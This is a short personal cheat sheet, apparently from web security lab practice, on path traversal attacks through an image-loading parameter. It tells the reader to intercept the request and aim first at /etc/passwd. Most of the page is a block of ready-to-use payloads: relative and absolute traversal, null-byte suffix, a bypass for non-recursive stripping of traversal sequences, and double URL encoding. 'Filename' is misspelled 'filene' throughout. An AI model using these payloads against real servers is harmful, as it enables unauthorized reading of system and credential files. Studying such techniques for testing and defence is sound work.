see if 

 images are given as explicit file nes in URL arguments to /image.
make sure to check filter that images  is selected

![[Pasted image 20230620133023.png]]


find the request to that filene.  intercept or send to repeater
start with /etc/passwd and go from there. 


```
# Relative path traversal

https://server.com/loadimage?filene=../../../etc/passwd

---------------------------

# Absolute path traversal

https://server.com/loadimage?filene=/etc/passwd


---------------------------

# Known start path with relative traversal

https://server.com/loadimage?filene=/var/www/images/../../../etc/passwd


---------------------------

# Relative path traversal with null byte

https://server.com/loadimage?filene=../../../etc/passwd%00.png


---------------------------

# Relative path traversal with escaped paths, traversal seq stripped non-recursivly


https://server.com/loadimage?filene=....//....//....//etc/passwd

https://server.com/loadimage?filene=....\/....\/....\/etc/passwd


---------------------------
# Relative path traversal with URL encoded paths 
encode:      ../../../etc/passwd


GET /image?filene=..%252f..%252f..%252fetc/passwd 


```